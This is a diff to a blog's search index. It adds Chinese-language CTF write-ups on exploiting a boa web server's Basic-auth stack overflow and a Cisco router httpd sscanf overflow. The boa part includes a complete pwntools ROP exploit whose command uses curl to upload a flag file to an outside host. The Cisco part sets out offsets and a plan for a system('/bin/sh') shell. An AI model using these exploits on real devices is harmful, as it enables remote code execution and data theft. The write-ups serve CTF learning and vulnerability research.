@@ -1,6 +1,110 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>西湖论剑IoT闯关赛-babyboa</title>
+    <url>/2020/11/16/xi-hu-lun-jian-iot-chuang-guan-sai-babyboa/</url>
+    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>本次赛题所有题目都是通过下面的板子作为载体，板子全是安恒Aodzip师傅手焊的。<img src="%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91IoT%E9%97%AF%E5%85%B3%E8%B5%9B-babyboa/image-20201116221316708.png" alt="">其中的uart口用于调试，otg口刷固件。pwr开关机键，RST复位键。</p>
+<p><img src="%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91IoT%E9%97%AF%E5%85%B3%E8%B5%9B-babyboa/image-20201116221021281.png" alt=""></p>
+<p>刷的固件存在spi flash中，带了编程器和烧录夹的兄弟萌，可以直接提取固件然后进入其中extra分区中，里面有flag。</p>
+<h1 id="漏洞定位"><a href="#漏洞定位" class="headerlink" title="漏洞定位"></a>漏洞定位</h1><p>其中的3道嵌入式pwn题目全是H4lo师傅出的，第一题是babyboa，提供的固件中提供了二进制boa和boa.conf。正常情况是不给调试的，除非大家都做不出来。</p>
+<p>配置文件boa.conf给的重点有：<code>ScriptAlias /cgi-bin/ /usr/lib/cgi-bin/</code>，这是要通过/cgi-bin/xxxx来触发漏洞？</p>
+<p>继续分析boa，boa服务器的特点参考<a href="http://www.boa.org/documentation/boa.html#toc3.3" target="_blank" rel="noopener">Differences between Boa and other web servers</a>：</p>
+<blockquote>
+<ul>
+<li><p><strong>There are no access control features</strong></p>
+<p>Boa will follow symbolic links, and serve any file that it can read. The expectation is that you will configure Boa to run as user “nobody”, and only files configured world readable will come out. </p>
+</li>
+</ul>
+</blockquote>
+<p>身份认证代码这块完全是二次开发的，大概率会出问题。通过寻找字符串“401 Unauthorized”定位到身份验证函数sub_1D1E4()，</p>
+<p><img src="%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91IoT%E9%97%AF%E5%85%B3%E8%B5%9B-babyboa/image-20201116225735429.png" alt=""></p>
+<p>其中sub_1D138函数读取/tmp/passwd内容，用于与输入的用户名密码进行比较。</p>
+<p><img src="%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91IoT%E9%97%AF%E5%85%B3%E8%B5%9B-babyboa/image-20201116225847902.png" alt=""></p>
+<p>定位到字符串“Basic”后，进行base64decode之后定位冒号“：”，获取用户输入的密码。strcpy()函数将输入到BSS段的434F8，本以为漏洞点是通过BSS溢出覆盖全局变量，然而并不是……</p>
+<p><img src="%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91IoT%E9%97%AF%E5%85%B3%E8%B5%9B-babyboa/image-20201116230932922.png" alt=""></p>
+<p>继续往下分析，strtok函数获取用户名，并且v6中的内容也是用户名。</p>
+<p>然后进入sub_1D1AC函数，真正的漏洞点位于其中的sprintf()，将用户名密码按照”%s:%s”格式拷贝到栈上局部变量中，用户名和密码都是可以控制的，缓冲区溢出没错了。</p>
+<p><img src="%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91IoT%E9%97%AF%E5%85%B3%E8%B5%9B-babyboa/image-20201116231347607.png" alt=""></p>
+<h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><h2 id="确定偏移"><a href="#确定偏移" class="headerlink" title="确定偏移"></a>确定偏移</h2><p>直接通过汇编能够看出来，R0距离LR的偏移为0x130。</p>
+<p><img src="%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91IoT%E9%97%AF%E5%85%B3%E8%B5%9B-babyboa/image-20201116231833861.png" alt=""></p>
+<h2 id="选择攻击路径构造ROP链"><a href="#选择攻击路径构造ROP链" class="headerlink" title="选择攻击路径构造ROP链"></a>选择攻击路径构造ROP链</h2><p>主要是找到system函数，然后将命令cmd地址输入到R0即可。</p>
+<p>需要注意的是00截断问题，payload中不能含有\x00。在没有调试的情况下，不清楚是否开启地址随机化，避免泄漏libc，需要通过在boa中找到能用的gadget并且要避免00截断。</p>
+<p>在boa中找到gadget，通过控制R6来控制R0，R0=[R6+0x10]&gt;&gt;8。将R6+0x10所指地址内容逻辑右移8位赋给R0。</p>
+<p><img src="%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91IoT%E9%97%AF%E5%85%B3%E8%B5%9B-babyboa/image-20201117003947312.png" alt=""></p>
+<p>所以<code>*(R6+0x10)</code>应该存放<code>&amp;cmd&lt;&lt;8</code> ，cmd字符串可以通过前面的strcpy拷贝到bss段。但是cmd字符串的地址应该怎么给到R6呢？想着通过boa中gadget来pop到R6。gadget都是以00字符串开头，这样就导致payload有两个gadget，那第一个gadget的00会被截断。</p>
+<p>但是在进入sub_1D1AC函数发送sprintf栈溢出之前，R6中的值为base64decode的返回值，也就是R6指向了base64解码之后的<code>username:password</code>字符串。之后<code>MOV     R0, R6</code>，R6和R0指向同一地址，通过strtok函数之后，R6指向为<code>:</code>前username字符串。</p>
+<p><img src="%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91IoT%E9%97%AF%E5%85%B3%E8%B5%9B-babyboa/image-20201117072728700.png" alt=""></p>
+<p>于是在R6+0x10所指地址处布置<code>&amp;cmd&lt;&lt;8</code>能够在执行gadget时使R0指向<code>cmd</code>字符串，并跳转至system，上面也提到<code>password</code>会被strcpy放置到bss段的0x434F8这个地址。那这个地址可以用来存放cmd命令。</p>
+<p>最后应该形成如下payload：</p>
+<pre class=" language-python"><code class="language-python">    offset <span class="token operator">=</span> <span class="token number">0x130</span>
+    cmd <span class="token operator">=</span> <span class="token string">'curl -X PUT 20.20.11.13:1111 -T /workspace/flag;'</span>
+    payload <span class="token operator">=</span> <span class="token string">""</span>
+    payload <span class="token operator">+=</span> <span class="token string">'a'</span> <span class="token operator">*</span> <span class="token number">0x10</span>                 <span class="token comment" spellcheck="true"># padding</span>
+    payload <span class="token operator">=</span> p32<span class="token punctuation">(</span><span class="token number">0x434F8bb</span><span class="token punctuation">)</span>             <span class="token comment" spellcheck="true"># &amp;cmd&lt;&lt;8</span>
+    payload <span class="token operator">=</span> payload<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span>offset<span class="token operator">-</span>len<span class="token punctuation">(</span>cmd<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token punctuation">)</span>                 <span class="token comment" spellcheck="true">#padding</span>
+    payload <span class="token operator">+=</span> <span class="token string">':'</span>                        <span class="token comment" spellcheck="true"># split username:password</span>
+    payload <span class="token operator">+=</span> cmd                        <span class="token comment" spellcheck="true"># cmd store to 0x434F8bb</span>
+    paylpad <span class="token operator">+=</span> p32<span class="token punctuation">(</span><span class="token number">0x1d2dc</span><span class="token punctuation">)</span>                <span class="token comment" spellcheck="true"># R6-gadget</span></code></pre>
+<h1 id="漏洞测试"><a href="#漏洞测试" class="headerlink" title="漏洞测试"></a>漏洞测试</h1><ul>
+<li><p>没有UART调试串口</p>
+<ul>
+<li>应该需要最新的ubuntu20.04，16.04和18.04报错内核too old</li>
+<li><code>qemu-arm -L /usr/arm-linux-gnueabi boa -c . -f boa.conf -d</code></li>
+</ul>
+</li>
+<li><p>UART调试串口</p>
+<ul>
+<li><p>SecureCRT或MobaXterm创建Serial session，波特率设置为115200</p>
+</li>
+<li><p>固件：<code>gdbserver :1234 --attach $PID</code></p>
+</li>
+<li><p>调试机：<code>gdb-multiarch boa -q -x $gdbscript</code></p>
+<pre class=" language-sh"><code class="language-sh">  set architecture arm
+    set sysroot .
+    target remote 20.20.11.14:1234
+    b *0x001D1C0
+    b *0x001D1DC</code></pre>
+</li>
+<li><p>服务重启：<code>/workspace/boa -c /html -f /etc/boa/boa.conf</code></p>
+</li>
+</ul>
+</li>
+</ul>
+<h1 id="Exp"><a href="#Exp" class="headerlink" title="Exp"></a>Exp</h1><pre class=" language-sh"><code class="language-sh">from pwn import *
+context(arch = 'arm', endian = 'little',log_level = 'debug' )
+
+p = remote("20.20.11.14",80)
+
+offset = 0x130
+cmd = 'curl -X PUT 20.20.11.13:1111 -T /workspace/flag;'
+payload = ""
+payload += 'a' * 0x10                 # padding
+payload += p32(0x434F8bb)             # &cmd<<8
+#payload += 'a' * 0xeb                 #padding
+payload = payload.ljust(offset-len(cmd)-1,'a') #padding
+payload += ':'                        # split username:password
+payload += cmd                        # cmd store to 0x434F8bb
+payload += p32(0x1d2dc)                # R6-gadget
+payload = base64.b64encode(payload)
+
+post = ''
+post += 'GET / HTTP/1.1\r\n'
+post += 'Host: 20.20.11.14\r\n'
+post += 'Authorization: Basic {}\r\n'.format(payload)
+post += '\r\n'
+p.send(post)
+p.close()</code></pre>
+<p><code>nc -vlp 1111</code></p>
+<p><img src="%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91IoT%E9%97%AF%E5%85%B3%E8%B5%9B-babyboa/image-20201117105843948.png" alt=""></p>
+]]></content>
+      <categories>
+        <category>iot</category>
+      </categories>
+      <tags>
+        <tag>boa</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>交叉编译mips架构gdb+gdbServer</title>
     <url>/2020/10/06/jiao-cha-bian-yi-mips-jia-gou-gdb-gdbserver/</url>
     <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>GDB + IDA + burp是吃饭三件套，一个能使用的gdb和gdbserver是调试IoT设备二进制漏洞的必备条件，之前都是从github下载他人编译好的，一旦他人gdb和gdbserver用不了的话，直接歇菜！</p>
@@ -149,6 +253,40 @@ mipsel-linux-strip gdbserver/gdbserver</code></pre>
 <h3 id="补丁比对"><a href="#补丁比对" class="headerlink" title="补丁比对"></a>补丁比对</h3><p>通过比对最新版本1.2.2.8与当前版本1.2.2.5版本能够发现厂商自行修补但未公布的漏洞。</p>
 <p>这里主要使用bindiff工具，结合IDA pro进行补丁比对。找到其中相同函数名，但是相似度不高的函数进行分析。</p>
 <p>本次的漏洞点是通过补丁比对找到的，能够清楚的找到在最新版本修复掉的危险函数。</p>
+<h1 id="漏洞定位与分析"><a href="#漏洞定位与分析" class="headerlink" title="漏洞定位与分析"></a>漏洞定位与分析</h1><p>binwalk解压后，针对web服务器二进制程序usr/sbin/httpd进行分析。</p>
+<p>httpd中guest_lougou_cgi()函数的sscanf函数。</p>
+<p><img src="2020%E5%BC%BA%E7%BD%91%E6%9D%AF%E5%86%B3%E8%B5%9BCisco%E8%B7%AF%E7%94%B1%E5%99%A8/sscanf.png" alt="Image"></p>
+<p>危险函数sscanf()将第一个参数的内容按照第二个参数的格式传递给后面的参数所对应的缓冲区中。而后两个缓冲区的大小都为0x40。</p>
+<p><img src="2020%E5%BC%BA%E7%BD%91%E6%9D%AF%E5%86%B3%E8%B5%9BCisco%E8%B7%AF%E7%94%B1%E5%99%A8/Image.png" alt="Image"></p>
+<p><img src="2020%E5%BC%BA%E7%BD%91%E6%9D%AF%E5%86%B3%E8%B5%9BCisco%E8%B7%AF%E7%94%B1%E5%99%A8/Image-1605237981005.png" alt="Image"></p>
+<p>第二个参数所对应的正则表达式含义：%表示匹配参数的个数，第一个<code>%[^;]</code>表示取值到指定的”;”为止的字符串其中第二个<code>%*</code>表示满足条件的字符串被过滤。整个sscanf的含义为：将haystack中的内容按照”;”之前的内容给变量acStack108，”;”到”=”之间的内容忽略，”=”之后的内容到换行”\n”之前的内容给变量acStack172。这个时候往前回溯可以发现要执行这个sscanf(),需要在haystack中找到status_guestnet.asp这个字符串。</p>
+<p><img src="2020%E5%BC%BA%E7%BD%91%E6%9D%AF%E5%86%B3%E8%B5%9BCisco%E8%B7%AF%E7%94%B1%E5%99%A8/Image-1605238213655.png" alt="Image"></p>
+<p>而haystack这个缓冲区中的内容通过get_cgi函数获取submit_button后的内容，</p>
+<p><img src="2020%E5%BC%BA%E7%BD%91%E6%9D%AF%E5%86%B3%E8%B5%9BCisco%E8%B7%AF%E7%94%B1%E5%99%A8/Image-1605238262615.png" alt="Image"></p>
+<p>通过fprintf打印的内容为submit_button对应的内容为_haystack，url对应的内容为acStack108，session_id的内容为acStack172。</p>
+<p><img src="2020%E5%BC%BA%E7%BD%91%E6%9D%AF%E5%86%B3%E8%B5%9BCisco%E8%B7%AF%E7%94%B1%E5%99%A8/Image-1605238365580.png" alt="Image"></p>
+<p>通过fprintf打印的内容为submit_button对应的内容为_haystack，url对应的内容为acStack108，session_id的内容为acStack172。</p>
+<p>同时要求_haystack中的内容包含status_guestnet.asp；第一个分号”;”之前的内容给acStack108，分号到等号之间的内容忽略，等号之后的内容给acStack172。所以可以这样构造数据包：</p>
+<p>submit_button=status_guestnet.asp;seesion_id=xxxxxxxxxxxxxxxx。这样执行完sscanf之后acStack108中的内容为status_guestnet.asp，acStack172内容为xxxxxxxxxxxxxxxx。因为acStack172的大 小为0x40而没有对submit_button之后的_haystack内容长度做限制，所以能够达到缓冲区溢出的目的。</p>
+<h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><p>整个漏洞利用过程是</p>
+<ul>
+<li>劫持PC，通过调试确定缓冲区大小，定位并确定控制偏移</li>
+<li>确定攻击路径，构造ROP链</li>
+<li>编写exp,getshell</li>
+</ul>
+<h2 id="劫持PC，确定偏移"><a href="#劫持PC，确定偏移" class="headerlink" title="劫持PC，确定偏移"></a>劫持PC，确定偏移</h2><p>距离返回地址的偏移可以直接通过IDA中的汇编代码获得。</p>
+<p>acStack172的内容是通过寄存器s5传递而来，acStack108的内容是通过寄存器fp中传递过来。</p>
+<p><img src="2020%E5%BC%BA%E7%BD%91%E6%9D%AF%E5%86%B3%E8%B5%9BCisco%E8%B7%AF%E7%94%B1%E5%99%A8/Image-1605238972710.png" alt="Image"></p>
+<p>往上查找发现fp是$(sp+0x7c)，所以acStack108的内容从$(sp+0x7c)开始。</p>
+<p><img src="2020%E5%BC%BA%E7%BD%91%E6%9D%AF%E5%86%B3%E8%B5%9BCisco%E8%B7%AF%E7%94%B1%E5%99%A8/Image-1605238989905.png" alt="Image"></p>
+<p>s5是$(SP+0xe8+var_AC)=$(SP+0x3c)，acStack172的内容从$(SP+0x3c)，在acStack108下方0x40处，会被acStack172覆盖。</p>
+<p><img src="2020%E5%BC%BA%E7%BD%91%E6%9D%AF%E5%86%B3%E8%B5%9BCisco%E8%B7%AF%E7%94%B1%E5%99%A8/Image-1605239039732.png" alt="Image"></p>
+<p>而返回地址ra保存在$(sp+0xe8+var_4)=$(sp+0xe4)</p>
+<p><img src="2020%E5%BC%BA%E7%BD%91%E6%9D%AF%E5%86%B3%E8%B5%9BCisco%E8%B7%AF%E7%94%B1%E5%99%A8/Image-1605239049033.png" alt="Image"></p>
+<p>所以acStack172输入的位置距离ra的偏移量为0xac-4=0xa8。</p>
+<h2 id="选择攻击路径构造ROP链"><a href="#选择攻击路径构造ROP链" class="headerlink" title="选择攻击路径构造ROP链"></a>选择攻击路径构造ROP链</h2><h4 id="通过system函数getshell"><a href="#通过system函数getshell" class="headerlink" title="通过system函数getshell"></a>通过system函数getshell</h4><p>主要目的是调用system(‘/bin/sh’)来getshell，system函数在libc.so中找，参数’/bin/sh’首先放入栈中，然后利用gadget将栈上的’/bin/sh’传入a0寄存器，再调用system函数即可。</p>
+<p>1.定位system函数地址</p>
+<p>知道偏移量之后考虑，该函数guest_logout_cgi要触发所对应的http报文中的资源请求句柄uri是啥！</p>
 <h1 id="劫持DNS"><a href="#劫持DNS" class="headerlink" title="劫持DNS"></a>劫持DNS</h1><p>在成功getshell之后，考虑如何劫持DNS，这里的方法有很多。</p>
 <p>大体步骤是：</p>
 <ol>
